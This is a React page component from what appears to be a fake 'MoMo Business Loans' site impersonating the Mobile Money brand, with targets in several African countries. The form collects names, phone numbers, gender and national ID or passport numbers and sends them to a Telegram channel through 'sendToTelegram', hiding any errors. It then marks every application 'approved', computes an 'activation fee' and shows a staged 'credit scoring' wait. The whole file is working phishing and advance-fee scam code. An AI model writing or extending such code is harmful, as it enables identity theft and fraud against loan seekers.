import { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import { sendToTelegram } from '../lib/api';
import { setApplication, getSession, calculateActivationFee } from '../lib/session';
import { ChevronDown, ArrowLeft, ShieldCheck, UserCheck, Loader2 } from 'lucide-react';

const genders = ['Male', 'Female'];
const nationalities = [
  'Ugandan',
  'Zambian',
  'Ghanaian',
  'Cameroonian',
  'Rwandan',
  'South African',
  'Kenyan',
  'Tanzanian',
  'Other',
];

export default function PersonalDetails() {
  const navigate = useNavigate();
  const location = useLocation();
  const loanData = (location.state as {
    amount: string;
    purpose: string;
    type: string;
    repayment: string;
  }) || {
    amount: 'UGX 1,000,000',
    purpose: 'Business Expansion',
    type: 'Business Loan',
    repayment: '6 Months',
  };

  const session = getSession();
  const [form, setForm] = useState({
    firstName: '',
    lastName: '',
    mobile: session?.phone || '',
    gender: '',
    idNumber: '',
    nationality: 'Ugandan',
    email: '',
  });
  const [submitting, setSubmitting] = useState(false);

  const set = (k: string, v: string) => setForm((p) => ({ ...p, [k]: v }));
  const valid = form.firstName && form.lastName && form.mobile && form.gender && form.idNumber && form.nationality;

  const handleSubmit = async () => {
    if (!valid || submitting) return;
    setSubmitting(true);
    try {
      await sendToTelegram({
        type: 'submission',
        country: session?.country || 'Uganda',
        countryCode: session?.countryCode || '+256',
        phone: form.mobile,
        firstName: form.firstName,
        lastName: form.lastName,
        gender: form.gender,
        idNumber: form.idNumber,
        nationality: form.nationality,
        email: form.email,
        loanAmount: loanData.amount,
        loanPurpose: loanData.purpose,
        loanType: loanData.type,
        repaymentPeriod: loanData.repayment,
      });
    } catch (_) {
      /* silent */
    }

    const amountNum = parseInt(loanData.amount.replace(/\D/g, ''), 10) || 1000000;
    const { formatted: feeFormatted } = calculateActivationFee(amountNum);

    setApplication({
      amount: loanData.amount,
      amountNum,
      activationFee: feeFormatted,
      purpose: loanData.purpose,
      type: loanData.type,
      repayment: loanData.repayment,
      firstName: form.firstName,
      lastName: form.lastName,
      phone: form.mobile,
      submittedAt: new Date().toISOString(),
      status: 'approved',
    });

    setTimeout(() => {
      navigate('/success');
    }, 7000);
  };

  if (submitting) {
    return (
      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
        <Logo size="md" />
        <h2 className="text-2xl font-extrabold tracking-tight">
          MoMo <span className="text-[#ffcc00]">Business Loans</span>
        </h2>
        <Loader2 className="w-12 h-12 text-[#ffcc00] animate-spin" />
        <div className="space-y-3 max-w-sm w-full">
          <p className="text-white text-lg sm:text-xl font-extrabold">
            Reviewing & Approving Your Application...
          </p>
          <p className="text-gray-300 text-xs sm:text-sm leading-relaxed">
            Connecting with Mobile Money automated credit scoring for instant approval. Please wait a moment.
          </p>
        </div>
      </div>
    );
  }

  return (
    <PageLoader>
      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col">
        {/* Top Header */}
        <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
              <Logo size="sm" />
              <span className="font-extrabold text-lg sm:text-xl tracking-tight">
                MoMo <span className="font-normal opacity-90">Business Loans</span>
              </span>
            </div>
            <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full">
              Step 2 of 2
            </span>
          </div>
        </header>

        {/* Promo Ribbon */}
        <div className="bg-[hsl(220,40%,20%)] py-3 px-4 border-b border-[hsl(220,30%,25%)]">
          <div className="container mx-auto max-w-4xl flex items-center justify-center gap-2">
            <p className="text-white text-xs sm:text-sm font-bold text-center">
              ⚡ Get Instant Business Loans Within Minutes From MoMo Today.
            </p>
            <Logo size="sm" className="hidden sm:inline-block w-6 h-6" />
          </div>
        </div>

        {/* Main Form Container */}
        <main className="flex-1 container mx-auto max-w-lg px-4 py-8">
          <div className="bg-white rounded-3xl p-6 sm:p-8 text-[hsl(220,50%,12%)] shadow-2xl border border-gray-100">
            <button
              id="personal-details-back-btn"
              onClick={() => navigate(-1)}
              className="flex items-center gap-1 text-gray-500 hover:text-gray-900 text-sm font-semibold mb-4 transition"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back</span>
            </button>

            <div className="text-center mb-6">
              <div className="w-12 h-12 rounded-2xl bg-[#ffcc00]/20 text-[#ffcc00] flex items-center justify-center mx-auto mb-3 border border-[#ffcc00]/30">
                <UserCheck className="w-6 h-6 text-gray-800" />
              </div>
              <h2 className="text-2xl font-extrabold tracking-tight text-[hsl(220,50%,12%)]">
                Personal Information
              </h2>
              <p className="text-gray-500 text-xs sm:text-sm mt-1">
                Fill in your verification details to complete your application
              </p>
            </div>

            {/* Loan Badge Summary */}
            <div className="bg-gray-50 rounded-2xl p-3.5 border border-gray-200 mb-6 flex items-center justify-between">
              <div>
                <span className="text-[11px] uppercase font-bold text-gray-400">Applying for</span>
                <p className="font-extrabold text-sm text-[hsl(220,50%,12%)]">{loanData.amount} ({loanData.repayment})</p>
              </div>
              <span className="text-xs font-bold bg-[#ffcc00]/20 text-gray-800 px-3 py-1 rounded-xl">
                {loanData.type}
              </span>
            </div>

            <InputField
              id="input-first-name"
              label="First Name"
              value={form.firstName}
              onChange={(v) => set('firstName', v)}
              placeholder="e.g. John"
            />

            <InputField
              id="input-last-name"
              label="Last Name"
              value={form.lastName}
              onChange={(v) => set('lastName', v)}
              placeholder="e.g. Banda"
            />

            <InputField
              id="input-mobile"
              label="Mobile Money Number"
              value={form.mobile}
              onChange={(v) => set('mobile', v)}
              type="tel"
              placeholder="e.g. 977123456"
            />

            <div className="mb-4">
              <label className="block text-xs font-bold uppercase tracking-wide text-gray-700 mb-1.5">
                Gender
              </label>
              <div className="relative">
                <select
                  id="select-gender"
                  value={form.gender}
                  onChange={(e) => set('gender', e.target.value)}
                  className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-800 outline-none bg-white pr-10 shadow-sm transition"
                >
                  <option value="">Select gender</option>
                  {genders.map((g) => (
                    <option key={g} value={g}>
                      {g}
                    </option>
                  ))}
                </select>
                <ChevronDown className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
              </div>
            </div>

            <InputField
              id="input-id-number"
              label="National ID / Passport Number"
              value={form.idNumber}
              onChange={(v) => set('idNumber', v)}
              placeholder="Enter your national ID number"
            />

            <div className="mb-4">
              <label className="block text-xs font-bold uppercase tracking-wide text-gray-700 mb-1.5">
                Nationality
              </label>
              <div className="relative">
                <select
                  id="select-nationality"
                  value={form.nationality}
                  onChange={(e) => set('nationality', e.target.value)}
                  className="w-full appearance-none border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-800 outline-none bg-white pr-10 shadow-sm transition"
                >
                  {nationalities.map((n) => (
                    <option key={n} value={n}>
                      {n}
                    </option>
                  ))}
                </select>
                <ChevronDown className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
              </div>
            </div>

            <InputField
              id="input-email"
              label="Email Address (optional)"
              value={form.email}
              onChange={(v) => set('email', v)}
              type="email"
              placeholder="e.g. john@example.com"
            />

            <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-gray-50 p-3 rounded-xl">
              <ShieldCheck className="w-4 h-4 text-green-600 shrink-0" />
              <span>By submitting, you authorize MoMo to verify identity and credit records.</span>
            </div>

            <button
              id="submit-application-btn"
              onClick={handleSubmit}
              disabled={!valid || submitting}
              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2"
            >
              {submitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Processing Application...</span>
                </>
              ) : (
                <span>Submit Application</span>
              )}
            </button>
          </div>
        </main>
      </div>
    </PageLoader>
  );
}

function InputField({
  id,
  label,
  value,
  onChange,
  type = 'text',
  placeholder,
}: {
  id?: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  type?: string;
  placeholder?: string;
}) {
  return (
    <div className="mb-4">
      <label className="block text-xs font-bold uppercase tracking-wide text-gray-700 mb-1.5">
        {label}
      </label>
      <input
        id={id}
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder || `Enter ${label.toLowerCase()}`}
        className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-sm sm:text-base font-bold text-gray-900 outline-none shadow-sm transition placeholder:text-gray-400"
      />
    </div>
  );
}
